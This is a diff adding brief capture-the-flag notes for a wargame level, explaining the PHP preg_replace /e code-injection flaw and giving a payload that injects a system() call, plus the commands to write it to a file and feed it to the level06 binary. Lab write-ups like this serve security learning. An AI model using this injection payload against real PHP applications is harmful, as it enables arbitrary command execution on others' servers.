@@ -1,0 +1,9 @@
+need to understand the preg_replace exploit 
+https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
+http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-php-pregreplace.html
+this is the vulnerability => [x {${@system(getflag)}}]
+x become the argument the rest become 2ndary argument not used
+code get that executed, here we use system call to get it run geftla
+
+echo "[x {${@system(getflag)}}]" > /tmp/detroie
+./level06 /tmp/detroie
